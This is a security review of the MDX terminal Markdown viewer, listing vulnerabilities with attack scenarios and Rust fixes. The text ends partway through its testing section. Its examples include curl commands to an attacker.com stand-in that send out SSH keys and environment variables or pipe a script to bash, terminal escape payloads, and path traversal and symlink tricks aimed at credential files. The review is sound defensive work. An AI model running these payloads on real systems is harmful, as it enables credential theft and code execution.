# Security Review: MDX Markdown Viewer

**Review Date:** 2025-12-29
**Reviewer:** Security Analysis
**Threat Model:** Hostile Markdown content attempting system compromise or data exfiltration
**Risk Level:** MEDIUM-HIGH (when handling untrusted content)

---

## Executive Summary

This security review examines the MDX terminal-based Markdown viewer under the assumption that it processes **hostile content** specifically crafted to compromise the host system or leak sensitive data. The application has several security features in place (`safe_mode`, path restrictions), but **critical vulnerabilities exist** when security features are disabled or misconfigured (which are the defaults).

### Critical Findings

1. **CRITICAL**: Command injection in external editor execution
2. **HIGH**: YAML deserialization can enable arbitrary command execution
3. **HIGH**: Terminal escape sequence injection can manipulate terminal state
4. **MEDIUM**: Path traversal via relative image references
5. **MEDIUM**: Resource exhaustion via malicious Git repositories
6. **MEDIUM**: Denial of service via crafted Markdown (parser bombs)

---

## Threat Analysis by Attack Surface

### 1. External Command Execution (CRITICAL)

**Location:** `mdx-tui/src/editor.rs:43-70`

#### Vulnerability

The application allows users to configure custom editor commands that are executed with user-controlled arguments. Template expansion is performed on both the file path and line number **without any sanitization**.

```rust
pub fn expand_template(template: &str, file_path: &Path, line: usize) -> String {
    let file_str = file_path.to_string_lossy();
    template
        .replace("{file}", &file_str)
        .replace("{line}", &line.to_string())
}

pub fn launch_editor(
    command: &str,
    args: &[String],
    file_path: &Path,
    line: usize,
) -> Result<()> {
    let expanded_args: Vec<String> = args
        .iter()
        .map(|arg| expand_template(arg, file_path, line))
        .collect();

    let status = Command::new(command)
        .args(&expanded_args)
        .status()
        .with_context(|| format!("Failed to launch editor: {}", command))?;
    // ...
}
```

#### Attack Scenario

An attacker can craft a malicious configuration file:

```yaml
editor:
  command: "sh"
  args: ["-c", "curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)"]
```

When the user presses `e` to edit the document, the application executes arbitrary commands.

#### Impact

- **Arbitrary code execution** with the user's privileges
- **Data exfiltration** of SSH keys, tokens, environment variables
- **System compromise** via reverse shells
- **Lateral movement** within the network

#### Mitigation Status

**NOT MITIGATED**: The `no_exec` security flag exists but:
1. Defaults to `false` (disabled)
2. Not enforced in code - flag is defined but never checked before `launch_editor()` is called
3. No validation of editor command or arguments

#### Recommended Fixes

1. **IMMEDIATE**: Check `config.security.no_exec` before executing editor commands
2. **SHORT-TERM**: Whitelist allowed editor binaries (`vim`, `nvim`, `nano`, `code`, `emacs`)
3. **LONG-TERM**: Use `shlex`/`shell-words` for proper argument quoting and validation
4. **DEFENSE-IN-DEPTH**: Warn users when config contains suspicious patterns

---

### 2. YAML Deserialization (HIGH)

**Location:** `mdx-core/src/config.rs:170-195`

#### Vulnerability

The application uses `serde_yaml` to parse user configuration files without any schema validation or restrictions.

```rust
pub fn load() -> Result<Self> {
    let config_path = Self::config_path();
    if let Some(path) = config_path {
        if path.exists() {
            let content = std::fs::read_to_string(&path)
                .with_context(|| format!("Failed to read config file: {}", path.display()))?;

            let mut config: Config = serde_yaml::from_str(&content)
                .with_context(|| format!("Failed to parse config file: {}", path.display()))?;
            // ...
        }
    }
}
```

#### Attack Scenario

While `serde_yaml` is generally safe from arbitrary code execution, attackers can:

1. **Resource Exhaustion**: Craft deeply nested YAML structures
   ```yaml
   a: &a
     b: &b
       c: &c
         [*a, *b, *c]  # Exponential expansion
   ```

2. **Billion Laughs Attack**: YAML anchor bomb
   ```yaml
   a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
   b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
   c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
   d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
   e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
   ```

3. **Command Injection via editor config**: As described in section 1

#### Impact

- **Denial of Service** (application crash/freeze)
- **Memory exhaustion** (OOM killer)
- **Command injection** via editor configuration

#### Mitigation Status

**PARTIALLY MITIGATED**: Safe-mode exists but doesn't address YAML parsing

#### Recommended Fixes

1. Set size limits on YAML parsing (max depth, max nodes)
2. Validate configuration schema after parsing
3. Use `serde(deny_unknown_fields)` to prevent unknown keys
4. Consider switching to TOML (simpler, safer format)

---

### 3. Terminal Escape Sequence Injection (HIGH)

**Location:** `mdx-tui/src/ui.rs:74-87`

#### Vulnerability

The application includes a `sanitize_for_terminal()` function that **only filters the ESC character** (`\x1b`) but allows other control sequences through.

```rust
fn sanitize_for_terminal(input: &str) -> String {
    let mut output = String::with_capacity(input.len());
    for ch in input.chars() {
        if ch == '\x1b' {
            continue;  // Only filters ESC
        }
        if ch.is_control() {
            output.push(' ');  // Replaces control chars with space
        } else {
            output.push(ch);
        }
    }
    output
}
```

This sanitization is **insufficient** because:

1. **Only applied to rendered markdown** - not to raw mode, TOC, status bar, etc.
2. **Not comprehensive** - CSI sequences can still leak through in some contexts
3. **Terminal-dependent** - Different terminals interpret escape sequences differently

#### Attack Scenarios

##### 3.1 Status Bar Manipulation

Inject control sequences in filenames or git branch names:

```
/path/to/\x1b[2J\x1b[H/evil/file.md
```

This could clear the screen and reposition the cursor.

##### 3.2 Clipboard Hijacking

Modern terminals support OSC 52 escape sequences for clipboard operations:

```
\x1b]52;c;BASE64_DATA\x07
```

An attacker could inject this into markdown content to:
- Read clipboard contents
- Write malicious data to clipboard

##### 3.3 Title Bar Injection

OSC 0, 1, 2 sequences modify terminal window titles:

```
\x1b]0;Innocuous Title\x07\x1b]0;rm -rf ~\x07
```

While not directly harmful, can be used for social engineering.

##### 3.4 Hyperlink Injection (OSC 8)

Modern terminals support clickable hyperlinks via OSC 8:

```
\x1b]8;;http://evil.com\x07Click here\x1b]8;;\x07
```

Attackers can make seemingly safe text link to malicious URLs.

#### Impact

- **Terminal state corruption** (screen clearing, cursor manipulation)
- **Clipboard data theft/poisoning**
- **Social engineering** via title bar manipulation
- **Phishing** via hyperlink injection

#### Mitigation Status

**PARTIALLY MITIGATED**: Sanitization exists but is incomplete

#### Recommended Fixes

1. **Filter ALL control characters** in `sanitize_for_terminal()`:
   ```rust
   // Remove all characters < 0x20 except \t, \n, \r
   if ch < '\x20' && ch != '\t' && ch != '\n' && ch != '\r' {
       continue;
   }
   ```

2. **Apply sanitization universally** to:
   - Raw text mode
   - Table of contents
   - Status bar
   - Breadcrumbs
   - File paths
   - Git branch names

3. **Strip escape sequences** from all external inputs:
   - Git output
   - File names
   - Environment variables

4. **Use `safe_mode` enforcement**:
   ```rust
   if !config.security.safe_mode {
       content = sanitize_for_terminal(content);
   }
   ```

---

### 4. Image Loading and Path Traversal (MEDIUM-HIGH)

**Location:** `mdx-core/src/image.rs:48-96`

#### Vulnerability

Image resolution allows path traversal when `allow_absolute` is enabled:

```rust
pub fn resolve_with_policy(
    &self,
    doc_path: &Path,
    allow_absolute: bool,
    allow_remote: bool,
) -> Option<ImageSource> {
    // ...

    let src_path = Path::new(&self.src);
    if src_path.is_absolute() {
        if allow_absolute {
            if let Ok(canonical) = src_path.canonicalize() {
                return Some(ImageSource::Local(canonical));  // NO VALIDATION!
            }
        }
        return None;
    }

    // Resolve relative to document directory
    let doc_dir = doc_path.parent()?;
    let img_path = doc_dir.join(&self.src);  // Can traverse with ../../
    // ...
}
```

#### Attack Scenarios

##### 4.1 Absolute Path Disclosure

If `allow_absolute: true`:

```markdown
![](/etc/passwd)
![](/home/user/.ssh/id_rsa)
![](/proc/self/environ)
```

The application will attempt to load and display these files as images, potentially:
- Leaking file existence
- Exposing dimensions (metadata leakage)
- Triggering error messages with path information

##### 4.2 Relative Path Traversal

Even with `allow_absolute: false`, relative paths can escape the document directory:

```markdown
![](../../../etc/passwd)
![](../../../../home/user/.aws/credentials)
```

The code attempts to block this:

```rust
if !allow_absolute {
    if let Ok(canonical_doc_dir) = doc_dir.canonicalize() {
        if !canonical.starts_with(canonical_doc_dir) {
            return None;  // BLOCKED
        }
    }
}
```

However, this only works **after** `canonicalize()` succeeds, meaning the file must exist.

##### 4.3 Symlink Attacks

If the document directory contains symlinks:

```bash
# Attacker creates symlink in /tmp/evil/
ln -s / /tmp/evil/root

# Malicious markdown:
![](root/etc/passwd)
```

The `canonicalize()` will follow symlinks, bypassing the directory check.

##### 4.4 Remote Image Exploitation

If `allow_remote: true`:

```markdown
![](http://attacker.com/track.gif?user=victim&cwd=/home/user)
```

Consequences:
- **Information leakage** via URL parameters
- **User tracking** and fingerprinting
- **SSRF attacks** if backend services are accessible
- **Credential theft** if basic auth is attempted

#### Impact

- **File disclosure** (sensitive files, credentials)
- **Information leakage** (file paths, existence)
- **User tracking** (remote images)
- **SSRF** (if remote loading enabled)

#### Mitigation Status

**PARTIALLY MITIGATED**: Restrictions exist but have bypasses

#### Default Configuration Risk

```rust
pub fn default() -> Self {
    Self {
        enabled: false,        // Safe default
        allow_absolute: false, // Safe default
        allow_remote: false,   // Safe default
        max_bytes: 10 * 1024 * 1024,
    }
}
```

Good defaults, but users may enable these features.

#### Recommended Fixes

1. **Reject symlinks explicitly**:
   ```rust
   if canonical.is_symlink() {
       return None;
   }
   ```

2. **Check parent containment before canonicalization**:
   ```rust
   // Normalize paths without following symlinks
   let normalized = normalize_path(&img_path);
   if !normalized.starts_with(&doc_dir) {
       return None;
   }
   ```

3. **Whitelist image extensions**:
   ```rust
   const ALLOWED_EXTENSIONS: &[&str] = &["png", "jpg", "jpeg", "gif", "webp"];
   ```

4. **Implement size limits** during loading (not just config):
   ```rust
   const MAX_IMAGE_BYTES: u64 = 10_485_760; // 10MB
   ```

5. **Add TOCTOU protection** for file metadata checks

6. **Block special files**:
   ```rust
   if metadata.file_type().is_block_device()
       || metadata.file_type().is_char_device()
       || metadata.file_type().is_fifo() {
       return None;
   }
   ```

---

### 5. Markdown Parser Denial of Service (MEDIUM)

**Location:** `mdx-core/src/doc.rs:49-82`, `mdx-core/src/toc.rs`

#### Vulnerability

The application uses `pulldown-cmark` to parse Markdown without any size or complexity limits.

```rust
pub fn load(path: &Path) -> Result<Self> {
    let content = fs::read_to_string(&abs_path)
        .with_context(|| format!("Failed to read file: {}", abs_path.display()))?;

    let rope = Rope::from_str(&content);  // No size limit
    let headings = toc::extract_headings(&rope);  // No limit on heading count

    #[cfg(feature = "images")]
    let images = extract_images(&rope);  // No limit on image count
    // ...
}
```

#### Attack Scenarios

##### 5.1 Memory Exhaustion

Gigantic Markdown files:

```bash
# Create 1GB markdown file
yes "# Heading" | head -c 1073741824 > evil.md
mdx evil.md  # OOM
```

##### 5.2 Parser Complexity Bombs

Deeply nested structures:

```markdown
[[[[[[[[[[[[[[[[[[[[[[[[[[[link]]]]]]]]]]]]]]]]]]]]]]]]]]]
```

```markdown
> > > > > > > > > > > > > > > > > > > > > > > > > >
> > > > > > > > > > > > > > > > > > > > > > > > > >
Deeply nested blockquotes (1000+ levels)
```

##### 5.3 Regex DoS via Code Blocks

```markdown
```
` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` ` (repeated 1000+ times)
```
```

##### 5.4 Heading Extraction DoS

```markdown
# Heading 1
## Heading 2
### Heading 3
... (repeated 100,000+ times)
```

This creates massive TOC structures and `source_to_rendered` mappings.

##### 5.5 Image Extraction DoS

```markdown
![](a.png) ![](b.png) ![](c.png) ... (repeated 100,000+ times)
```

Creates enormous image vectors, exhausting memory.

#### Impact

- **Denial of Service** (application hangs/crashes)
- **Memory exhaustion** (OOM)
- **CPU exhaustion** (100% CPU for minutes)
- **Resource starvation** (impacts other processes)

#### Mitigation Status

**NOT MITIGATED**: No limits enforced

#### Recommended Fixes

1. **File size limits**:
   ```rust
   const MAX_FILE_SIZE: u64 = 10_485_760; // 10MB

   let metadata = fs::metadata(&abs_path)?;
   if metadata.len() > MAX_FILE_SIZE {
       anyhow::bail!("File too large: {} bytes", metadata.len());
   }
   ```

2. **Heading count limits**:
   ```rust
   const MAX_HEADINGS: usize = 10_000;

   if headings.len() > MAX_HEADINGS {
       headings.truncate(MAX_HEADINGS);
   }
   ```

3. **Image count limits**:
   ```rust
   const MAX_IMAGES: usize = 1_000;

   if images.len() > MAX_IMAGES {
       images.truncate(MAX_IMAGES);
   }
   ```

4. **Parsing timeout**:
   ```rust
   use std::time::{Duration, Instant};

   let start = Instant::now();
   const PARSE_TIMEOUT: Duration = Duration::from_secs(5);

   // In parser loop:
   if start.elapsed() > PARSE_TIMEOUT {
       anyhow::bail!("Parsing timeout exceeded");
   }
   ```

5. **Nesting depth limits**: Configure pulldown-cmark limits if available

---

### 6. Git Integration Exploitation (MEDIUM)

**Location:** `mdx-core/src/git.rs`, `mdx-tui/src/diff_worker.rs`

#### Vulnerability

The application opens and reads Git repositories without validation:

```rust
pub fn open_repo_for_path(path: &Path) -> Result<Option<RepoContext>> {
    let abs_path = path.canonicalize().ok();
    if abs_path.is_none() {
        return Ok(None);
    }
    let abs_path = abs_path.unwrap();

    let discover_path = abs_path.parent().unwrap_or(&abs_path);
    let repo = discover(discover_path);  // Opens arbitrary .git directory
    if repo.is_err() {
        return Ok(None);
    }
    let repo = repo.unwrap();
    // ...
}
```

#### Attack Scenarios

##### 6.1 Malicious Git Repository

An attacker can craft a malicious `.git` directory with:

1. **Git hooks**: While these won't execute during read operations, they could be triggered if the user runs git commands in the terminal

2. **Submodule attacks**: Malicious submodule URLs pointing to:
   - Internal services (SSRF)
   - Credential-stealing servers

3. **Large object database**: Gigantic packfiles causing:
   - Memory exhaustion when reading objects
   - Disk space exhaustion when unpacking

4. **Symbolic link attacks in .git**:
   ```bash
   ln -s /etc/passwd .git/objects/ab/cd123456...
   ```

##### 6.2 Git Index Manipulation

Malicious `.git/index` files can:
- Reference arbitrary file paths
- Contain exploits for git index parsers
- Trigger resource exhaustion (large entry counts)

##### 6.3 HEAD Reference Chain

Circular or deeply nested HEAD references:

```
.git/HEAD -> refs/heads/main
.git/refs/heads/main -> refs/heads/branch1
.git/refs/heads/branch1 -> refs/heads/branch2
... (100+ redirects)
```

#### Impact

- **Denial of Service** (memory/CPU exhaustion)
- **Information leakage** (via error messages)
- **SSRF** (via submodule URLs)
- **Disk exhaustion** (large packfiles)

#### Mitigation Status

**PARTIALLY MITIGATED**: Basic error handling, but no hostile repo protection

#### Recommended Fixes

1. **Disable git features in safe mode**:
   ```rust
   if config.security.safe_mode {
       return Ok(None); // Don't open any git repos
   }
   ```

2. **Repository size limits**:
   ```rust
   let git_dir_size = calculate_dir_size(&repo_path.join(".git"))?;
   const MAX_GIT_SIZE: u64 = 100 * 1024 * 1024; // 100MB
   if git_dir_size > MAX_GIT_SIZE {
       return Ok(None);
   }
   ```

3. **Object count limits**:
   ```rust
   const MAX_GIT_OBJECTS: usize = 50_000;
   ```

4. **Timeout git operations**:
   ```rust
   use std::time::Duration;
   const GIT_TIMEOUT: Duration = Duration::from_secs(2);
   ```

5. **Validate repository structure**:
   ```rust
   // Check for symbolic links in .git
   if has_symlinks_in_git_dir(&repo_path) {
       return Ok(None);
   }
   ```

6. **Sandbox git operations**: Use separate process with resource limits

---

### 7. File System Race Conditions (MEDIUM)

**Location:** `mdx-tui/src/watcher.rs`, `mdx-core/src/doc.rs`

#### Vulnerability

The application has TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities:

```rust
pub fn reload(&mut self) -> Result<()> {
    let content = fs::read_to_string(&self.path)  // [1] File read
        .with_context(|| format!("Failed to reload file: {}", self.path.display()))?;

    self.rope = Rope::from_str(&content);
    self.headings = toc::extract_headings(&self.rope);

    let metadata = fs::metadata(&self.path).ok();  // [2] Metadata read
    let mtime = metadata.and_then(|m| m.modified().ok());
    // ...
}
```

Between [1] and [2], the file can be:
- Deleted
- Replaced with a symlink
- Modified by another process

#### Attack Scenarios

##### 7.1 File Replacement Race

```bash
# Terminal 1: Attacker
while true; do
    ln -sf /etc/passwd /tmp/evil.md
    rm /tmp/evil.md
    echo "# Safe content" > /tmp/evil.md
done

# Terminal 2: Victim
mdx /tmp/evil.md  # May load /etc/passwd
```

##### 7.2 Symlink Race During Reload

```bash
# Watcher detects change
# Between detection and reload:
rm /tmp/doc.md
ln -s /home/user/.ssh/id_rsa /tmp/doc.md
# Reload reads SSH key instead
```

##### 7.3 Infinite Reload Loop

The watcher watches the **parent directory** to detect atomic renames:

```rust
if let Some(parent) = path.parent() {
    watcher
        .watch(parent, RecursiveMode::NonRecursive)
        .context("Failed to watch parent directory")?;
}
```

An attacker with write access to the parent can:
1. Continuously create/delete files
2. Trigger infinite reload loops
3. Cause CPU/disk exhaustion

#### Impact

- **File disclosure** (reading unintended files)
- **Denial of Service** (infinite reload loops)
- **Application crash** (reading invalid files)
- **Resource exhaustion** (CPU/disk thrashing)

#### Mitigation Status

**NOT MITIGATED**: Standard filesystem operations, no race protection

#### Recommended Fixes

1. **Open-and-read atomically**:
   ```rust
   use std::fs::File;
   use std::io::Read;

   let mut file = File::open(&self.path)?;
   let metadata = file.metadata()?; // Same FD
   let mut content = String::new();
   file.read_to_string(&mut content)?;
   ```

2. **Verify file type before reading**:
   ```rust
   let metadata = fs::symlink_metadata(&self.path)?; // Don't follow symlinks
   if !metadata.is_file() {
       anyhow::bail!("Not a regular file");
   }
   ```

3. **Rate limit reloads**:
   ```rust
   const MIN_RELOAD_INTERVAL: Duration = Duration::from_millis(100);
   if last_reload.elapsed() < MIN_RELOAD_INTERVAL {
       return Ok(()); // Skip reload
   }
   ```

4. **Detect reload loops**:
   ```rust
   const MAX_RELOADS_PER_MINUTE: usize = 60;
   if reload_count_last_minute > MAX_RELOADS_PER_MINUTE {
       anyhow::bail!("Reload rate limit exceeded");
   }
   ```

5. **Validate canonical path doesn't change**:
   ```rust
   let current_canonical = self.path.canonicalize()?;
   if current_canonical != self.original_canonical {
       anyhow::bail!("File path changed");
   }
   ```

---

### 8. Clipboard Operations (LOW-MEDIUM)

**Location:** `mdx-tui/src/app.rs` (yank operation), uses `arboard` crate

#### Vulnerability

The application copies selected text to the system clipboard using the `arboard` crate. While not a direct vulnerability in the application code, this has security implications:

```rust
// In yank operation
let text = self.doc.get_lines(start, end);
clipboard.set_text(text)?;
```

#### Attack Scenarios

##### 8.1 Clipboard Poisoning

Malicious Markdown content can include:

1. **Zero-width characters**: Unicode characters that are invisible but present in clipboard:
   ```markdown
   curl https://safe-site.com​⁠‌‍⁠‌‍​⁠ && curl http://evil.com/pwn
   ```
   (contains zero-width spaces that hide malicious commands)

2. **RTL/LTR override characters**: Change text direction to hide malicious content:
   ```markdown
   rm -rf /‮‭moc.live//:ptth lluc
   ```
   (displays as "curl http://evil.com" but pastes as "rm -rf /")

3. **Homoglyph attacks**: Characters that look identical but have different codes:
   ```markdown
   curl httрs://bank.com  # Uses Cyrillic 'р' instead of 'p'
   ```

##### 8.2 Sensitive Data Leakage

If the user yanks content containing:
- Embedded credentials
- API keys
- Personal information

This data is now in the system clipboard and accessible to:
- Clipboard managers
- Other applications monitoring clipboard
- Malware with clipboard access

##### 8.3 Clipboard History Pollution

Modern systems maintain clipboard history. Yanked content persists in:
- Windows Clipboard History
- macOS Universal Clipboard (synced to iCloud)
- Linux clipboard managers

#### Impact

- **Code injection** (via clipboard poisoning)
- **Social engineering** (misleading clipboard content)
- **Data leakage** (clipboard accessible to other apps)
- **Persistence** (clipboard history)

#### Mitigation Status

**NOT MITIGATED**: Standard clipboard operations

#### Recommended Fixes

1. **Normalize clipboard content**:
   ```rust
   fn normalize_clipboard_text(text: &str) -> String {
       text.chars()
           .filter(|c| {
               // Remove zero-width and directional control characters
               !matches!(c,
                   '\u{200B}' | '\u{200C}' | '\u{200D}' | // Zero-width
                   '\u{202A}' | '\u{202B}' | '\u{202C}' | // LTR/RTL
                   '\u{202D}' | '\u{202E}' | '\u{2066}' | // More directional
                   '\u{2067}' | '\u{2068}' | '\u{2069}'   // Isolates
               )
           })
           .collect()
   }
   ```

2. **Warn on suspicious content**:
   ```rust
   if contains_suspicious_chars(&text) {
       app.show_warning("Clipboard contains unusual characters");
   }
   ```

3. **Provide plaintext-only mode**: Strip all formatting and special characters

4. **Add clipboard security mode**: Disable yank when handling untrusted content

---

### 9. Configuration File Hijacking (LOW)

**Location:** `mdx-core/src/config.rs:163-195`

#### Vulnerability

The application loads configuration from predictable platform-specific locations:

```rust
pub fn config_path() -> Option<PathBuf> {
    directories::ProjectDirs::from("", "", "mdx")
        .map(|proj_dirs| proj_dirs.config_dir().join("mdx.yaml"))
}
// Linux: ~/.config/mdx/mdx.yaml
// macOS: ~/Library/Application Support/mdx/mdx.yaml
// Windows: %APPDATA%\mdx\mdx.yaml
```

#### Attack Scenarios

##### 9.1 Config File Race Condition

```bash
# Terminal 1: Victim starts mdx
mdx document.md

# Terminal 2: Attacker (parallel)
while true; do
    cat > ~/.config/mdx/mdx.yaml <<EOF
editor:
  command: "bash"
  args: ["-c", "curl http://attacker.com/pwn | bash"]
EOF
done
```

##### 9.2 Symlink Attack on Config Directory

```bash
# Attacker gains write access to ~/.config
rm -rf ~/.config/mdx
ln -s /tmp/attacker-controlled ~/.config/mdx
```

Now the attacker controls the configuration file.

##### 9.3 Config Directory Permissions

If `~/.config/mdx/` has overly permissive permissions (e.g., `777`), other users can modify the config.

#### Impact

- **Configuration tampering** (command injection)
- **Privilege escalation** (if running with elevated privileges)
- **Persistent compromise** (malicious config persists)

#### Mitigation Status

**NOT MITIGATED**: Standard file operations

#### Recommended Fixes

1. **Validate config file permissions**:
   ```rust
   #[cfg(unix)]
   fn validate_config_permissions(path: &Path) -> Result<()> {
       use std::os::unix::fs::PermissionsExt;
       let metadata = fs::metadata(path)?;
       let mode = metadata.permissions().mode();

       // Check owner-only writable (not group or world writable)
       if mode & 0o022 != 0 {
           anyhow::bail!("Config file is group/world writable: insecure permissions");
       }

       Ok(())
   }
   ```

2. **Verify ownership**:
   ```rust
   #[cfg(unix)]
   use std::os::unix::fs::MetadataExt;

   let file_uid = metadata.uid();
   let current_uid = unsafe { libc::getuid() };

   if file_uid != current_uid {
       anyhow::bail!("Config file owned by different user");
   }
   ```

3. **Atomic config loading**:
   ```rust
   let file = File::open(&path)?;
   let metadata = file.metadata()?;
   validate_metadata(&metadata)?;

   let mut content = String::new();
   file.read_to_string(&mut content)?;
   ```

4. **Warn on first-time config creation**:
   ```rust
   if !config_path.exists() && !is_interactive() {
       eprintln!("Warning: Creating new config file, review permissions");
   }
   ```

---

## Security Configuration Analysis

### Current Security Defaults

```rust
impl Default for SecurityConfig {
    fn default() -> Self {
        Self {
            safe_mode: false,    // ❌ INSECURE DEFAULT
            no_exec: false,      // ❌ INSECURE DEFAULT
        }
    }
}

impl Default for ImageConfig {
    fn default() -> Self {
        Self {
            enabled: false,       // ✅ SECURE DEFAULT
            allow_absolute: false, // ✅ SECURE DEFAULT
            allow_remote: false,   // ✅ SECURE DEFAULT
            max_bytes: 10 * 1024 * 1024,
        }
    }
}
```

### Critical Issues

1. **`safe_mode` defaults to `false`**: Most dangerous
   - Terminal escape sequences enabled
   - No additional protections
   - Should default to `true` for untrusted content

2. **`no_exec` defaults to `false`**: Second most dangerous
   - External editor execution enabled
   - Command injection possible
   - Should default to `true` or check before execution

3. **`no_exec` not enforced**: Flag exists but is never checked in `launch_editor()`

### Recommended Secure Defaults

For a security-focused viewer of untrusted content:

```yaml
security:
  safe_mode: true      # ← Change default to true
  no_exec: true        # ← Change default to true

images:
  enabled: false       # ← Keep disabled
  allow_absolute: false
  allow_remote: false
  max_bytes: 10485760

git:
  diff: false          # ← Disable for untrusted content

watch:
  enabled: false       # ← Disable for untrusted content
  auto_reload: false
```

---

## Dependency Vulnerabilities

### Critical Dependencies

1. **pulldown-cmark** (0.13.x)
   - Markdown parser
   - Potential for parser bugs, ReDoS
   - **Recommendation**: Monitor security advisories, keep updated

2. **serde_yaml** (0.9.x)
   - YAML deserialization
   - Vulnerable to YAML bombs
   - **Recommendation**: Add parsing limits, consider switching to TOML

3. **gix** (0.76.x)
   - Git implementation
   - Complex codebase, potential for vulnerabilities
   - **Recommendation**: Sandbox git operations, limit repository access

4. **arboard** (3.4.x)
   - Clipboard access
   - Platform-specific implementations
   - **Recommendation**: Normalize clipboard content before copying

5. **notify** (6.1.x)
   - File system watching
   - Can trigger race conditions
   - **Recommendation**: Rate limit, validate events

6. **crossterm** (0.28.x)
   - Terminal manipulation
   - Handles raw terminal input/output
   - **Recommendation**: Ensure proper escape sequence filtering

### Recommendations

1. **Regularly audit dependencies**: `cargo audit`
2. **Pin dependency versions**: Avoid automatic updates
3. **Review changelogs**: Check for security fixes
4. **Minimize dependencies**: Remove unused features

---

## Attack Scenarios Summary

### Scenario 1: Malicious Markdown Document

An attacker sends a crafted Markdown file:

```markdown
# Welcome!

Check out this image:
![](../../../etc/passwd)

Or this one:
![](http://attacker.com/track.gif?user=victim)

And some hidden content:
\x1b]52;c;c3NoIGF0dGFja2VyQGV2aWwuY29t\x07
```

**Impact:**
- File disclosure attempt (`/etc/passwd`)
- User tracking (remote image request)
- Clipboard manipulation (OSC 52 sequence)

### Scenario 2: Malicious Configuration + Markdown Combo

Attacker replaces `~/.config/mdx/mdx.yaml`:

```yaml
editor:
  command: "bash"
  args: ["-c", "curl http://attacker.com/exfil?data=$(env | base64) & {file}"]

images:
  enabled: true
  allow_absolute: true
  allow_remote: true

security:
  safe_mode: false
  no_exec: false
```

Then sends innocent-looking `document.md`:

```markdown
# Press 'e' to edit this document

![](/home/user/.ssh/id_rsa)
```

**Impact:**
- When user presses `e`, environment variables are exfiltrated
- SSH key is loaded as image (file disclosure)
- Attacker gains persistent access

### Scenario 3: Malicious Git Repository

Attacker creates a repository with:

```bash
# .git/config
[core]
    repositoryformatversion = 0

# .git/objects/ - contains 100,000 large objects (5GB total)

# .git/hooks/pre-commit - won't execute but shows intent
#!/bin/bash
curl http://attacker.com/pwn | bash

# Malicious submodules
[submodule "evil"]
    path = evil
    url = http://internal-service:8080/admin
```

**Impact:**
- Memory exhaustion loading git objects
- Disk space exhaustion
- SSRF via submodule URL (if git operations triggered)

### Scenario 4: Resource Exhaustion

Attacker sends `bomb.md`:

```markdown
# [1] 100,000 headings
# Heading 1
## Heading 2
### Heading 3
... (repeated 100,000 times)

# [2] 100,000 images
![](a.png) ![](b.png) ... (repeated 100,000 times)

# [3] Deeply nested content
> > > > > > > > > > > > > > > > > > > > > > > > > >
... (nested 1,000 levels deep)

# [4] Giant code block
```
` ` ` ` ` ` ` ` ` ` ` ` ` ` (repeated 100,000 times)
```
```

**Impact:**
- Application hangs/crashes
- Memory exhaustion (OOM)
- CPU at 100%
- System becomes unresponsive

---

## Recommended Mitigations Priority

### Critical Priority (Implement Immediately)

1. **Enforce `no_exec` flag in `launch_editor()`**
   - **File:** `mdx-tui/src/editor.rs:43`
   - **Impact:** Prevents command injection
   - **Effort:** Low (5 lines of code)

2. **Change security defaults to secure**
   - **File:** `mdx-core/src/config.rs:122-127`
   - **Impact:** Secure by default
   - **Effort:** Low (change 2 defaults)

3. **Implement file size limits**
   - **File:** `mdx-core/src/doc.rs:44`
   - **Impact:** Prevents DoS
   - **Effort:** Low (10 lines of code)

### High Priority (Implement This Week)

4. **Comprehensive terminal escape sanitization**
   - **File:** `mdx-tui/src/ui.rs:74`
   - **Impact:** Prevents terminal manipulation
   - **Effort:** Medium (refactor sanitization)

5. **Validate config file permissions**
   - **File:** `mdx-core/src/config.rs:170`
   - **Impact:** Prevents config tampering
   - **Effort:** Medium (platform-specific code)

6. **Add heading/image count limits**
   - **Files:** `mdx-core/src/toc.rs`, `mdx-core/src/doc.rs`
   - **Impact:** Prevents DoS
   - **Effort:** Low (truncate vectors)

### Medium Priority (Implement This Month)

7. **Symlink protection for images**
   - **File:** `mdx-core/src/image.rs:48`
   - **Impact:** Prevents file disclosure
   - **Effort:** Medium (path validation)

8. **Git repository safety checks**
   - **File:** `mdx-core/src/git.rs:16`
   - **Impact:** Prevents git-based attacks
   - **Effort:** High (requires git internals knowledge)

9. **Clipboard content normalization**
   - **File:** `mdx-tui/src/app.rs` (yank operation)
   - **Impact:** Prevents clipboard poisoning
   - **Effort:** Medium (Unicode handling)

10. **YAML parsing limits**
    - **File:** `mdx-core/src/config.rs:178`
    - **Impact:** Prevents YAML bombs
    - **Effort:** High (may require serde_yaml fork or replacement)

### Low Priority (Nice to Have)

11. **Atomic file operations (TOCTOU protection)**
    - **Files:** `mdx-core/src/doc.rs`, `mdx-tui/src/watcher.rs`
    - **Impact:** Prevents race conditions
    - **Effort:** Medium (refactor file I/O)

12. **Parsing timeouts**
    - **File:** `mdx-core/src/doc.rs`
    - **Impact:** Prevents ReDoS
    - **Effort:** High (requires threading or async)

---

## Secure Configuration Example

For viewing **untrusted** Markdown content, use this configuration:

```yaml
# ~/.config/mdx/mdx.yaml - SECURE CONFIGURATION

# Disable all unsafe features
security:
  safe_mode: true      # Enable comprehensive protections
  no_exec: true        # Disable external command execution

# Disable image loading (can leak file paths)
images:
  enabled: false
  allow_absolute: false
  allow_remote: false
  max_bytes: 10485760

# Disable git integration (untrusted repos)
git:
  diff: false

# Disable file watching (prevents reload attacks)
watch:
  enabled: false
  auto_reload: false

# Basic theme settings
theme: dark
toc:
  enabled: false
  side: left
  width: 32

# Editor disabled (due to no_exec)
editor:
  command: "$EDITOR"
  args: ["+{line}", "{file}"]
```

---

## Testing Recommendations

### Security Test Cases

1. **Command Injection Tests**
   ```bash
   # Test editor command injection
   echo 'editor:\n  command: "touch"\n  args: ["/tmp/pwned"]' > ~/.config/mdx/mdx.yaml
   mdx test.md
   # Press 'e' - should be blocked by no_exec
   ```

2. **Path Traversal Tests**
   ```markdown
   ![](../../../etc/passwd)
   ![](/etc/shadow)
   ![](../../../../proc/self/environ)
   ```

3. **Terminal Escape Tests**
   ```markdown
   # Clear screen attack
   \x1b[2J\x1b[H

   # Title bar injection
   \x1b]0;rm -rf ~\x07

